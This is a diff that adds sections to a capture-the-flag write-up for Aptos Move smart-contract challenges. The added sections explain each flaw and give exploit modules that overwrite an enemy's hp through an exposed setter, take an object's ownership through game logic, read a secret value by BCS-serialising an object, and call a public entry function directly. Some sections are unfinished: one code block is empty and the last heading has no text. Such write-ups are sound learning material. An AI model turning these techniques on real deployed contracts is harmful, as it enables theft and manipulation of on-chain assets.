@@ -117,26 +117,151 @@ module solution::exploit {
 
 ![](./images/3.png)
 
+## super mario 16
+
+This is the first challenge of a series of super mario challenges, our goal is to set the `peach.kidnapped` to `false`.
+
+In this challenge, we need to make `mario.hp >= bowser.hp` and call the `battle` function in the challenge contract to meet the requirements. We can see that the `initialize` function sets the `bowser.hp` to `254` and the initial value of `mario.hp` is `0`. So we need to increase the value of `mario.hp` or decrease the value of `bowser.hp`.
+
+For this challenge we have two ways to solve it:
+* Call `train_mario` function 127 times to increase the value of `mario.hp` to `254`.
+* Using the `get_wrapper` function to get the `bowser` object and call the `set_hp` function to set the `bowser.hp` to `0`.
+
+The solution contract is as follows:
+
+```move
+module solution::exploit {
+    use challenge::router::{Self, Mario, Bowser};
+    use aptos_framework::object;
+
+    public entry fun solve(account: &signer) {
+        let addr = router::start_game(account);
+        let mario = object::address_to_object<Mario>(addr);
+        let addr2 = router::get_wrapper();
+        let bowser = object::address_to_object<Bowser>(addr2);
+        router::set_hp(account, bowser, 0);
+        router::battle(account, mario);
+    }
+}
+```
+
 ## super mario 32
+
+The difference between this challenge and the previous one is that the comparison between `mario.hp` and `bowser.hp` is changed to `mario.hp > bowser.hp`. So the method of using `train_mario` function to increase the value of `mario.hp` to `254` is no longer feasible. But we can still use the `get_wrapper` function to get the `bowser` object and call the `set_hp` function to set the `bowser.hp` to `0`.
+
+The solution contract is as follows:
+
+```move
+module solution::exploit {
+    use challenge::router::{Self, Mario, Bowser};
+    use aptos_framework::object;
+
+    public entry fun solve(account: &signer) {
+        let addr = router::start_game(account);
+        let mario = object::address_to_object<Mario>(addr);
+        router::train_mario(account, mario);
+        let addr2 = router::get_wrapper();
+        let bowser = object::address_to_object<Bowser>(addr2);
+        router::set_hp(account, bowser, 0);
+        router::battle(account, mario);
+    }
+}
+```
 
 ![](./images/4.png)
 
 ## super mario 64
 
+The difference between this challenge and the previous one is that add check for the `owner` of the object in `set_hp` function. It results in that we can't set the `bowser.hp` to `0` directly. So we need to dig deeper into the challenge contract.
+
+We can see that when `mario.hp == bowser.hp`, the `battle` function will burn the mario object that we pass in and transfer the mario object to the `account` which is created in `initialize` function and belongs to the same object as `bowser`. So we can use the `train_mario` function to make `mario.hp` equal to `bowser.hp` and call the `battle` function to make the `owner` of the `bowser` to be our `account`.
+
+The solution contract is as follows:
+
+```move
+module solution::exploit {
+    use challenge::router::{Self, Mario, Bowser};
+    use aptos_framework::object;
+
+    public entry fun solve(account: &signer) {
+        let addr = router::start_game(account);
+        let mario = object::address_to_object<Mario>(addr);
+        for (i in 0..127) {
+            router::train_mario(account, mario);
+        };
+        router::battle(account, mario);
+        let wrapper = router::get_wrapper();
+        let bowser = object::address_to_object<Bowser>(wrapper);
+        router::set_hp(account, bowser, 0);
+        router::battle(account, mario);
+    }
+}
+```
+
 ![](./images/5.png)
 
 ## Zero Knowledge Bug
+
+In this challenge, the remote server will generate random value and call the `set_knowledge` function in challenge contract. You need to "guess" the random value three times to solve this challenge.
+
+The challenge contract provide a function `get_knowledge` to get the `Knowledge` object, and we need to pass the `Knowledge` object and the "guess" value to the `prove` function to check if the "guess" value is equal to the random value. But you'll find that you can access the field of object outside the module where the object is defined. The solution is using the `std::bcs` module to serialize the `Knowledge` object and get the random value.
+
+The solution contract is as follows:
+
+```move
+module solution::exploit {
+    use zkb::verify;
+    use std::bcs;
+    use std::vector;
+
+    public entry fun solve(account: &signer) {
+        let know = verify::get_knowledge();
+        let bytes = bcs::to_bytes(&know);
+        let secret_value = vector::borrow(&bytes, 0);
+        verify::prove(&mut know, (*secret_value as u64), account);
+    }
+}
+```
 
 ![](./images/7.png)
 
 ## groth16
 
+This challenge ostensibly requires you to provide a proof of groth16, but if you run the server locally, you will find that the `A` of `proof` is a illegal value and results in a exception. This makes me very confused as first.
+
+When the author releases a [hint](https://aptos.dev/en/build/smart-contracts/book/functions#public-visibility) of this challenge, I see that the visibility of the `modify_value` function is `public entry`. So we can just call this function directly and meet the requirements of the challenge.
+
+We just need to add one line of code to the `solve.py`:
+
+```python
+invoke_function(b"0x0000000000000000000000000000000000000000000000000000000000001337::flag::modify_value", conn)
+```
+
 ![](./images/6.png)
 
 ## sage
 
+It's a math problem, we can use the `solve_mod` function in sagemath to solve this problem, the solution is as follows:
+
+```python
+```
+
+The solution contract is as follows:
+
+```move
+module solution::exploit {
+    use challenge::sage;
+
+    public entry fun solve() {
+        sage::challenge(vector[22, 12, 17, 6, 17, 0, 19, 20, 33, 0, 19, 8, 14, 13, 18, 24, 36, 20, 0, 10, 37, 0, 28, 4, 3, 41, 36, 1, 17, 37, 0, 32, 19, 7, 4, 29, 8, 11, 11, 34, 18, 39, 35, 32, 5, 11, 4, 16, 30, 39, 11, 4, 7, 0, 22, 8, 28, 15, 33, 0, 13, 4, 41], vector[25, 11, 6, 32, 13, 3, 12, 19, 2]);
+    }
+}
+```
+
 ![](./images/8.png)
 
 ## Simple Swap
+
+
 
 ![](./images/9.png)
